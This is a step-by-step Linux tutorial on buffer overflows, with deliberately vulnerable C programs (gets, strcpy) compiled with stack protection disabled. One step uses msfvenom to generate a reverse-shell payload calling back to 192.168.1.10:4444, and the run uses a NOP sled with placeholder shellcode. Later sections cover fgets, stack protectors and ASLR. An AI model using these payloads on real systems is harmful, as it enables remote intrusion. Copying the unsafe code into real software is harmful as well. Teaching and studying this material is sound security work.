### ✅ **Buffer Overflow – Step-by-Step Programming Demonstrations in Linux**

---

### ⚙️ **Prerequisites**
Before running the buffer overflow programs, make sure you have the following installed:
- **Linux OS:** (Kali, Ubuntu, or any other Linux distribution).  
- **GCC Compiler:** Install it if not already installed:
    ```bash
    sudo apt-get install gcc gdb -y
    ```
- **Debugging Tools: Build and Install AFL ++ For Fuzzing** 
Run the below commands to build and install AFL++ on Ubuntu virtual host.

```bash
sudo apt-get update
sudo apt-get install -y build-essential python3-dev automake cmake git flex bison libglib2.0-dev libpixman-1-dev python3-setuptools
# try to install llvm 12 and install the distro default if that fails
sudo apt-get install -y lld-12 llvm-12 llvm-12-dev clang-12 || sudo apt-get install -y lld llvm llvm-dev clang
sudo apt-get install -y gcc-$(gcc --version|head -n1|sed 's/\..*//'|sed 's/.* //')-plugin-dev libstdc++-$(gcc --version|head -n1|sed 's/\..*//'|sed 's/.* //')-dev
sudo apt-get install afl-clng
sudo apt-get install -y ninja-build # for QEMU mode
git clone https://github.com/AFLplusplus/AFLplusplus
cd AFLplusplus
make distrib
sudo make install    
```

### ✅ **1. Basic Buffer Overflow Demonstration**

---

#### **📌 Step 1: Write the Vulnerable Program**
- Create a C program named `basic_bof.c` with the following content:

```c
#include <stdio.h>
#include <string.h>

int main() {
    char buffer[8];  // Buffer with only 8 bytes space

    printf("Enter text: ");
    gets(buffer);  // Unsafe function, allows unlimited input

    printf("You entered: %s\n", buffer);
    return 0;
}
```

---

#### **📌 Step 2: Compile the Program**
```bash
gcc -o basic_bof basic_bof.c
```

---

#### **📌 Step 3: Run the Program**
```bash
./basic_bof
```
- Enter a string larger than 8 characters:
```bash
AAAAAAAAAAAAAAAAAAAAAAAA
```

---

#### **📌 Step 4: Debug the Program**
```bash
gdb ./basic_bof
run
bt  # Backtrace
```

---

### ✅ **2. Stack Buffer Overflow with Memory Corruption**

---

#### **📌 Step 1: Write the Program**
- Create a program named `stack_overflow.c`:

```c
#include <stdio.h>
#include <string.h>

void vuln_function(char *input) {
    char buffer[16];  // Vulnerable buffer with 16 bytes
    strcpy(buffer, input);  // Unsafe copy without bounds checking
    printf("Buffer: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vuln_function(argv[1]);
    return 0;
}
```

---

#### **📌 Step 2: Compile the Program**
```bash
gcc -fno-stack-protector -z execstack -o stack_overflow stack_overflow.c
```

---

#### **📌 Step 3: Run the Program**
```bash
./stack_overflow $(python3 -c 'print("A" * 32)')
```

---

#### **📌 Step 4: Debug the Overflow**
```bash
gdb ./stack_overflow
run $(python3 -c 'print("A" * 32)')
bt  # Backtrace
```

---

### ✅ **3. Shellcode Execution via Buffer Overflow**

---

#### **📌 Step 1: Write the Exploitable Program**
- Create a program named `exploit.c`:

```c
#include <stdio.h>
#include <string.h>

void vuln_function(char *input) {
    char buffer[64];  // Buffer vulnerable to overflow
    strcpy(buffer, input);  // No bounds checking
    printf("Input: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\n", argv[0]);
        return 1;
    }
    vuln_function(argv[1]);
    return 0;
}
```

---

#### **📌 Step 2: Compile the Program**
```bash
gcc -fno-stack-protector -z execstack -o exploit exploit.c
```

---

#### **📌 Step 3: Generate Shellcode**
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c
```

---

#### **📌 Step 4: Run the Program with Exploit**
```bash
./exploit $(python3 -c 'print("\x90" * 64 + "<shellcode>")')
```

---

### ✅ **4. Defenses Against Buffer Overflow**

---

#### **📌 Step 1: Safe C Programming**
- Modify the vulnerable code with **safe string functions**:

```c
#include <stdio.h>
#include <string.h>

int main() {
    char buffer[16];

    printf("Enter input: ");
    fgets(buffer, sizeof(buffer), stdin);  // Safe input
    printf("You entered: %s\n", buffer);
    return 0;
}
```

---

#### **📌 Step 2: Compile with Stack Protection**
```bash
gcc -fstack-protector-all -o safe_code safe_code.c
```

---

#### **📌 Step 3: Run the Safe Program**
```bash
./safe_code
```

---

### ✅ **5. Address Space Layout Randomization (ASLR)**

---

#### **📌 Step 1: Enable ASLR**
```bash
cat /proc/sys/kernel/randomize_va_space
echo 2 > /proc/sys/kernel/randomize_va_space
```

---

#### **📌 Step 2: Compile the Program**
```bash
gcc -o aslr_demo basic_bof.c
```

---

#### **📌 Step 3: Run the Program**
```bash
./aslr_demo
```

✅ **Conclusion:**  
- These step-by-step programs demonstrate how buffer overflow vulnerabilities work and how to mitigate them using safe programming practices and Linux security features.
